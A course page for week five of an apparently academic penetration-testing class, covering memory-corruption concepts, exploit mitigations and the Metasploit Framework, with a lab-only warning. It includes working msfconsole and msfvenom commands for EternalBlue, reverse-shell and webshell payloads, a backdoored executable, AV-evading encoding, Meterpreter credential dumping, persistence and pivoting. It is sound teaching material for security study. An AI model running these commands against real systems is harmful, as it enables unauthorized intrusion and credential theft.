---
title: "Week 5 — Exploitation Fundamentals & Metasploit"
description: Understand exploit development concepts and master the Metasploit Framework for structured, controlled exploitation in lab environments.
---

# Week 5 — Exploitation Fundamentals & Metasploit

<div class="week-meta" markdown>
**Course Objectives:** CO3 &nbsp;|&nbsp; **Focus:** Exploitation &nbsp;|&nbsp; **Difficulty:** ⭐⭐⭐☆☆
</div>

---

## Learning Objectives

- [ ] Explain memory corruption vulnerabilities (buffer overflow, heap overflow, use-after-free)
- [ ] Navigate the Metasploit Framework to select, configure, and execute exploits
- [ ] Generate and deliver payloads using msfvenom
- [ ] Establish and manage Meterpreter sessions
- [ ] Identify and apply basic privilege escalation techniques post-exploitation

---

## 1. Exploitation Fundamentals

### 1.1 What is an Exploit?

An exploit is code that takes advantage of a software vulnerability to cause unintended behavior — typically gaining unauthorized code execution.

```
Vulnerability + Exploit Code + Payload = Compromise
     ↑               ↑            ↑
What's broken   How to trigger   What to run
```

### 1.2 Memory Corruption Vulnerabilities

**Stack-Based Buffer Overflow:**
```
Normal Stack Layout:
┌────────────────┐ ← High addresses
│  Arguments     │
├────────────────┤
│ Return Address │ ← EIP/RIP — attacker goal: overwrite this
├────────────────┤
│   Saved EBP   │
├────────────────┤
│ Local Variables│
│  (buffer[256]) │ ← Input copied here
└────────────────┘ ← Low addresses

When input exceeds buffer size, it overwrites EIP.
Attacker controls EIP → redirects execution to shellcode.
```

**Common Memory Vulnerability Classes:**

| Vulnerability | Description | Example |
|---------------|-------------|---------|
| **Stack Buffer Overflow** | Input exceeds stack buffer, overwrites return address | strcpy, gets, sprintf without bounds check |
| **Heap Buffer Overflow** | Overflow in heap-allocated memory | malloc'd structures |
| **Use-After-Free (UAF)** | Access memory after it's freed | Browser exploit primary vector |
| **Integer Overflow** | Math overflow causing small buffer allocation | size_t arithmetic errors |
| **Format String** | User-controlled printf format string | printf(user_input) without format spec |
| **Null Pointer Dereference** | Dereference of NULL pointer | Often causes crash/DoS |

### 1.3 Modern Exploit Mitigations

Defenders have layered multiple protections that modern exploits must bypass:

| Mitigation | How it Works | Bypass Technique |
|------------|-------------|------------------|
| **ASLR** | Randomizes memory layout at load | Info leak + ROP chains |
| **NX/DEP** | Makes stack non-executable | Return-Oriented Programming (ROP) |
| **Stack Canary** | Detects stack overwrites before return | Canary leak via format string |
| **PIE** | Position Independent Executable | Info leak to defeat randomization |
| **SafeSEH** | Protects exception handlers (Windows) | ROP or SEH overwrite with valid handler |
| **CFG** | Control Flow Guard — validates indirect calls | Target non-CFG-protected modules |

---

## 2. The Metasploit Framework

Metasploit is the world's most used penetration testing platform, providing a structured environment for exploit development, delivery, and post-exploitation.

### 2.1 Architecture

```
Metasploit Framework
├── Exploits/       → Code that triggers the vulnerability
├── Payloads/       → Code that runs after exploitation  
│   ├── Singles     → Self-contained (no staging)
│   ├── Stagers     → Small initial payload, downloads stage
│   └── Stages      → Meterpreter, shell, VNC, etc.
├── Auxiliary/      → Scanners, fuzzers, DoS modules (no payload)
├── Post/           → Post-exploitation modules
├── Encoders/       → Obfuscate payloads to evade AV
└── Evasion/        → Anti-AV/EDR techniques
```

### 2.2 Core Commands

```bash
# Launch Metasploit console
msfconsole

# Search for exploits
msf6 > search eternalblue
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2021-44228

# Select and configure a module
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info          # Show module details
msf6 exploit(ms17_010_eternalblue) > show options  # Show required options

# Set options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set RPORT 445
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50

# Select payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run the exploit
msf6 exploit(ms17_010_eternalblue) > run     # or: exploit
```

### 2.3 Payload Types

```bash
# List available payloads for current exploit
msf6 exploit(...)> show payloads

# Common payload types:
# windows/meterpreter/reverse_tcp     → Meterpreter over TCP (most common)
# windows/meterpreter/reverse_https   → HTTPS (bypasses many firewalls)
# windows/shell/reverse_tcp           → Simple cmd.exe shell
# linux/x64/meterpreter/reverse_tcp   → Linux Meterpreter
# java/meterpreter/reverse_tcp        → Java-based (cross-platform)
# php/meterpreter/reverse_tcp         → PHP webshell upgrade

# Connection types:
# reverse_*   → Target connects back to attacker (firewall-friendly)
# bind_*      → Attacker connects to target (requires inbound access)
```

### 2.4 msfvenom — Standalone Payload Generator

```bash
# Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o malware.exe

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell.elf

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# Embed in existing EXE (backdoor template)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -x legitimate.exe -f exe -o backdoor.exe

# Encode to evade AV (limited effectiveness against modern AV)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded.exe
```

---

## 3. Meterpreter — The Advanced Payload

Meterpreter runs entirely in memory, leaving minimal disk artifacts. It communicates over encrypted channels and supports dynamic extension loading.

### 3.1 Core Meterpreter Commands

```bash
# Session management
meterpreter > sysinfo            # OS, hostname, architecture
meterpreter > getuid             # Current user context
meterpreter > getpid             # Current process ID

# Navigation
meterpreter > pwd                # Current directory
meterpreter > ls                 # List directory
meterpreter > cd C:\\Users       # Change directory
meterpreter > download file.txt  # Download file
meterpreter > upload shell.exe   # Upload file

# Process operations
meterpreter > ps                 # List running processes
meterpreter > migrate 1234       # Migrate to PID 1234 (persistence)
meterpreter > shell              # Drop to native shell

# Privilege escalation
meterpreter > getsystem          # Attempt local privilege escalation
meterpreter > getprivs           # List privileges

# Credentials
meterpreter > hashdump           # Dump SAM database hashes
meterpreter > run post/windows/gather/credentials/credential_collector

# Persistence
meterpreter > run post/windows/manage/persistence
```

### 3.2 Pivoting Through Meterpreter

```bash
# Route traffic through compromised host to reach internal network
meterpreter > run post/multi/manage/autoroute

# In MSF console:
msf6 > route add 10.10.10.0/24 [session_id]

# Now scan internal network through compromised host
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.0/24
```

---

## 4. Common Exploit Targets (Lab Context)

!!! warning "Lab Environment Only"
    All exploitation must be performed **exclusively** in authorized lab environments (HackTheBox, TryHackMe, dedicated lab VMs). Never use these techniques against systems without explicit written authorization.

| Vulnerability | CVE | CVSS | Metasploit Module |
|--------------|-----|------|-------------------|
| EternalBlue (SMBv1) | CVE-2017-0144 | 9.8 | `exploit/windows/smb/ms17_010_eternalblue` |
| BlueKeep (RDP) | CVE-2019-0708 | 9.8 | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
| Log4Shell | CVE-2021-44228 | 10.0 | `exploit/multi/http/log4shell_header_injection` |
| PrintNightmare | CVE-2021-34527 | 8.8 | `exploit/windows/local/cve_2021_34527_printnightmare` |
| Shellshock | CVE-2014-6271 | 9.8 | `exploit/multi/http/apache_mod_cgi_bash_env_exec` |

---

## 5. Basic Privilege Escalation Concepts

Post initial compromise, attackers seek to elevate privileges:

```
Initial Access:    Low-privileged user (www-data, normal user)
Goal:              Administrator / root / SYSTEM

Windows Privesc Paths:
  Token impersonation (Potato attacks: JuicyPotato, PrintSpoofer)
  Unquoted service paths
  Weak service permissions
  AlwaysInstallElevated (registry misconfiguration)
  Stored credentials (registry, files, browser)
  Kernel exploits (MS16-032, MS15-051)

Linux Privesc Paths:
  SUID/SGID binaries (find / -perm -4000)
  Sudo misconfigurations (sudo -l)
  Cron job path hijacking
  Writable /etc/passwd
  NFS no_root_squash
  Kernel exploits
```

---

## Key Vocabulary

| Term | Definition |
|------|------------|
| **Exploit** | Code that leverages a vulnerability for unauthorized access |
| **Payload** | Code executed on target after successful exploitation |
| **Meterpreter** | Advanced in-memory Metasploit payload |
| **ASLR** | Address Space Layout Randomization — anti-exploit defense |
| **ROP** | Return-Oriented Programming — ASLR/DEP bypass technique |
| **Buffer Overflow** | Writing beyond allocated buffer boundaries |
| **Reverse Shell** | Target connects back to attacker's listener |
| **Bind Shell** | Attacker connects forward to listener on target |
| **Staging** | Two-stage payload: small stager downloads larger stage |

---

## Review Questions

!!! question "Self-Assessment"
    1. Explain why stack canaries help prevent buffer overflow exploitation.
    2. A target runs Windows 7 SP1 with SMBv1 enabled. Map out your complete exploitation path using Metasploit.
    3. Why is a reverse TCP payload generally more reliable than a bind payload in enterprise environments?
    4. You have a Meterpreter session as `www-data` (web server user). What are your next steps?
    5. Describe two methods for maintaining persistent access after a Meterpreter session is established.

---

## Further Reading

- 📖 *The Art of Exploitation, 2nd Ed.* — Jon Erickson, Chapters 1–4
- 📖 *Hacking Exposed 7*, Chapter 12 — "Exploiting the Network"
- 📄 [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) — free OffSec course
- 📄 [GTFOBins](https://gtfobins.github.io/) — Linux privilege escalation via misconfigurations
- 📄 [LOLBAS](https://lolbas-project.github.io/) — Windows Living Off The Land Binaries

---

*[← Week 4](week04.md) &nbsp;|&nbsp; [Course Index](index.md) &nbsp;|&nbsp; [Week 6 →](week06.md)*
